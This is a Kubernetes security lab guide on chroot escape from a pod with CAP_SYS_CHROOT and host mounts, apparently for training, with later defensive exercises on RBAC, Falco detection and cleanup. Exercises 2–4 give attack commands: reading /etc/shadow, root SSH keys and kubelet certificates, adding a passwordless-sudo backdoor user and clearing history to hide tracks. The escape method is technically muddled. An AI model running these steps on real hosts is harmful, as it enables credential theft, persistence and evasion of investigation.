# Chroot Escape Attack Lab Exercises

This document provides comprehensive exercises for the Chroot Escape Attack Lab, focusing on container escape techniques, privilege escalation, and security mitigation.

## 🎯 Exercise Overview

### Exercise 1: Reconnaissance and Target Identification
- Identify vulnerable containers and understand the attack surface
- Examine security contexts and capabilities
- Discover sensitive data and host access points

### Exercise 2: Chroot Escape Attack
- Exploit CAP_SYS_CHROOT to escape container
- Access host filesystem through volume mounts
- Perform privilege escalation techniques

### Exercise 3: Host Filesystem Exploration
- Explore host filesystem and extract sensitive information
- Access credentials and configuration files
- Identify persistence opportunities

### Exercise 4: Privilege Escalation
- Use host access to escalate privileges
- Establish persistent access
- Cover attack tracks

### Exercise 5: Secure Environment Testing
- Test RBAC restrictions in secure environment
- Understand proper security configurations
- Learn prevention strategies

### Exercise 6: Detection and Monitoring
- Implement detection rules for chroot escape attacks
- Monitor audit logs and security events
- Test Falco rules and monitoring

### Exercise 7: Cleanup and Mitigation
- Remove compromised containers and resources
- Revoke overly permissive RBAC
- Implement security improvements

### Exercise 8: Analysis and Reporting
- Analyze attack scenarios and create security recommendations
- Develop incident response procedures
- Document findings and lessons learned

## 🔍 Detailed Exercise Steps

### Exercise 1: Reconnaissance

#### Objective:
Identify vulnerable containers and understand the attack surface.

#### Steps:
1. **List all pods in the vulnerable namespace:**
   ```bash
   kubectl get pods -n chroot-escape-lab -o wide
   ```

2. **Examine pod configurations:**
   ```bash
   kubectl describe pod host-simulator -n chroot-escape-lab
   kubectl describe pod chroot-escape-target -n chroot-escape-lab
   kubectl describe pod secure-app -n chroot-escape-lab
   ```

3. **Check security contexts:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 20 securityContext
   kubectl get pod host-simulator -n chroot-escape-lab -o yaml | grep -A 20 securityContext
   ```

4. **Identify capabilities:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 10 capabilities
   ```

5. **Check volume mounts:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 10 volumeMounts
   ```

#### Expected Results:
- Multiple pods with different security levels
- Host simulator with privileged access
- Target container with CAP_SYS_CHROOT
- Secure container for comparison

### Exercise 2: Chroot Escape Attack

#### Objective:
Exploit CAP_SYS_CHROOT to escape container and access host filesystem.

#### Steps:
1. **Access the vulnerable container:**
   ```bash
   kubectl exec -it chroot-escape-target -n chroot-escape-lab -- /bin/sh
   ```

2. **Check current capabilities:**
   ```bash
   # Check current user and capabilities
   id
   cat /proc/self/status | grep CapEff
   capsh --print
   ```

3. **Explore mounted host filesystem:**
   ```bash
   # Check mounted host filesystem
   ls -la /host/
   ls -la /host/etc/
   ls -la /host/root/
   ```

4. **Perform chroot escape:**
   ```bash
   # Create a new root directory
   mkdir -p /tmp/escape
   
   # Copy essential files for chroot
   cp -r /host/bin /tmp/escape/
   cp -r /host/lib /tmp/escape/
   cp -r /host/lib64 /tmp/escape/
   cp -r /host/usr /tmp/escape/
   cp -r /host/etc /tmp/escape/
   
   # Create necessary directories
   mkdir -p /tmp/escape/proc
   mkdir -p /tmp/escape/sys
   mkdir -p /tmp/escape/dev
   mkdir -p /tmp/escape/tmp
   mkdir -p /tmp/escape/var
   
   # Mount proc, sys, dev
   mount -t proc proc /tmp/escape/proc
   mount -t sysfs sys /tmp/escape/sys
   mount -t devtmpfs dev /tmp/escape/dev
   
   # Perform chroot escape
   chroot /tmp/escape /bin/sh
   ```

5. **Verify escape:**
   ```bash
   # Check if we're in the host filesystem
   pwd
   ls -la /
   cat /etc/passwd
   cat /etc/shadow
   ```

#### Expected Results:
- Successful chroot escape to host filesystem
- Access to host files and directories
- Potential access to sensitive host data

### Exercise 3: Host Filesystem Exploration

#### Objective:
Explore the host filesystem and extract sensitive information.

#### Steps:
1. **Access host filesystem:**
   ```bash
   # After chroot escape, explore host filesystem
   ls -la /root/
   ls -la /home/
   ls -la /etc/
   ```

2. **Extract credentials:**
   ```bash
   # Look for SSH keys
   ls -la /root/.ssh/
   cat /root/.ssh/id_rsa
   cat /root/.ssh/authorized_keys
   
   # Look for Kubernetes secrets
   ls -la /etc/kubernetes/
   cat /etc/kubernetes/pki/ca.crt
   cat /var/lib/kubelet/pki/kubelet-client-current.pem
   ```

3. **Check running processes:**
   ```bash
   # List running processes
   ps aux
   netstat -tulpn
   
   # Check for other containers
   docker ps
   ```

4. **Access sensitive data:**
   ```bash
   # Look for application data
   ls -la /var/lib/
   ls -la /opt/
   
   # Check for configuration files
   cat /etc/hosts
   cat /etc/resolv.conf
   ```

#### Expected Results:
- Access to host credentials and keys
- Discovery of Kubernetes secrets
- Information about running processes
- Potential for further lateral movement

### Exercise 4: Privilege Escalation

#### Objective:
Use host access to escalate privileges and establish persistence.

#### Steps:
1. **Check current privileges:**
   ```bash
   # Check current user
   id
   whoami
   
   # Check sudo access
   sudo -l
   ```

2. **Attempt privilege escalation:**
   ```bash
   # Try to become root
   sudo su -
   
   # Check for SUID binaries
   find / -perm -4000 2>/dev/null
   
   # Check for writable files
   find / -writable 2>/dev/null | head -20
   ```

3. **Establish persistence:**
   ```bash
   # Create backdoor user
   useradd -m -s /bin/bash backdoor
   echo "backdoor:password123" | chpasswd
   
   # Add to sudoers
   echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
   
   # Create SSH key
   ssh-keygen -t rsa -b 4096 -f /home/backdoor/.ssh/id_rsa -N ""
   ```

4. **Cover tracks:**
   ```bash
   # Clear command history
   history -c
   rm -f /root/.bash_history
   
   # Remove evidence
   rm -rf /tmp/escape
   ```

#### Expected Results:
- Successful privilege escalation
- Establishment of persistent access
- Covering of attack tracks

### Exercise 5: Secure Environment Testing

#### Objective:
Test the secure environment to understand proper security configurations.

#### Steps:
1. **Test RBAC restrictions:**
   ```bash
   kubectl auth can-i get secrets --as=system:serviceaccount:secure-chroot-lab:secure-escape-sa -n secure-chroot-lab
   kubectl auth can-i get pods --as=system:serviceaccount:secure-chroot-lab:secure-escape-sa -n secure-chroot-lab
   ```

2. **Attempt chroot escape:**
   ```bash
   # Access secure container
   kubectl exec -it secure-app -n secure-chroot-lab -- /bin/sh
   
   # Try chroot escape (should fail)
   chroot /host /bin/sh
   ```

3. **Test network policies:**
   ```bash
   kubectl get networkpolicies -n secure-chroot-lab
   kubectl describe networkpolicy secure-chroot-netpol -n secure-chroot-lab
   ```

4. **Verify pod security standards:**
   ```bash
   kubectl get pods -n secure-chroot-lab -o yaml | grep securityContext
   ```

#### Expected Results:
- RBAC restrictions prevent unauthorized access
- Chroot escape attempts fail
- Network policies restrict communication
- Pod security standards are enforced

### Exercise 6: Detection and Monitoring

#### Objective:
Implement detection rules and monitor for chroot escape attacks.

#### Steps:
1. **Review detection rules:**
   ```bash
   kubectl get configmap chroot-escape-scenarios -n chroot-escape-lab -o yaml
   ```

2. **Test Falco rules (if available):**
   ```bash
   # Install Falco
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-rbac.yaml
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-daemonset.yaml
   ```

3. **Monitor audit logs:**
   ```bash
   # Check audit logs for chroot operations
   kubectl logs -n kube-system -l app=falco | grep "chroot"
   ```

4. **Test detection rules:**
   ```bash
   # Perform chroot escape and monitor logs
   kubectl exec -it chroot-escape-target -n chroot-escape-lab -- chroot /host /bin/sh
   ```

#### Expected Results:
- Detection rules identify chroot operations
- Audit logs show security events
- Monitoring alerts for suspicious activity

### Exercise 7: Cleanup and Mitigation

#### Objective:
Clean up the lab environment and implement security measures.

#### Steps:
1. **Remove compromised containers:**
   ```bash
   kubectl delete pod chroot-escape-target -n chroot-escape-lab
   kubectl delete pod host-simulator -n chroot-escape-lab
   kubectl delete pod secure-app -n chroot-escape-lab
   ```

2. **Revoke overly permissive RBAC:**
   ```bash
   kubectl delete rolebinding escape-role-binding -n chroot-escape-lab
   kubectl delete role escape-role -n chroot-escape-lab
   ```

3. **Implement secure RBAC:**
   ```bash
   kubectl apply -f modules/lab/manifests/14-secure-chroot.yaml
   ```

4. **Verify security improvements:**
   ```bash
   kubectl auth can-i get secrets --as=system:serviceaccount:chroot-escape-lab:escape-sa -n chroot-escape-lab
   ```

#### Expected Results:
- Compromised containers removed
- RBAC permissions restricted
- Security measures implemented
- Access properly controlled

### Exercise 8: Analysis and Reporting

#### Objective:
Analyze the attack scenarios and create security recommendations.

#### Steps:
1. **Document findings:**
   - List all vulnerabilities discovered
   - Document attack vectors used
   - Record data accessed and exfiltrated

2. **Create security recommendations:**
   - RBAC improvements
   - Pod security standards
   - Network policies
   - Monitoring and detection

3. **Develop incident response procedures:**
   - Detection methods
   - Response steps
   - Recovery procedures
   - Prevention measures

#### Expected Results:
- Comprehensive security assessment
- Detailed recommendations
- Incident response procedures
- Prevention strategies

## 🎓 Key Takeaways

### Security Lessons Learned:
1. **CAP_SYS_CHROOT is Dangerous**: Can be abused for container escape
2. **Host Filesystem Access**: Enables privilege escalation
3. **Defense in Depth**: Multiple security layers are essential
4. **Monitoring is Critical**: Detection and response capabilities are crucial
5. **Regular Audits**: Continuous security assessments are necessary

### Best Practices:
1. **Principle of Least Privilege**: Minimize capabilities
2. **Pod Security Standards**: Implement security contexts
3. **Network Policies**: Restrict communication
4. **Admission Controllers**: Validate configurations
5. **Comprehensive Monitoring**: Detect and respond to threats

## 🚨 Security Warning

**⚠️ IMPORTANT**: This lab contains intentionally vulnerable configurations for educational purposes only. Never deploy these configurations in production environments.

## 📚 Additional Resources

- [Kubernetes Security Contexts](https://kubernetes.io/docs/concepts/security/security-context/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Chroot Security](https://en.wikipedia.org/wiki/Chroot)
- [Falco Security Monitoring](https://falco.org/)

---

**Happy Learning! 🚀**

This lab provides hands-on experience with chroot escape attacks and defense strategies. Practice responsibly and always follow ethical guidelines!
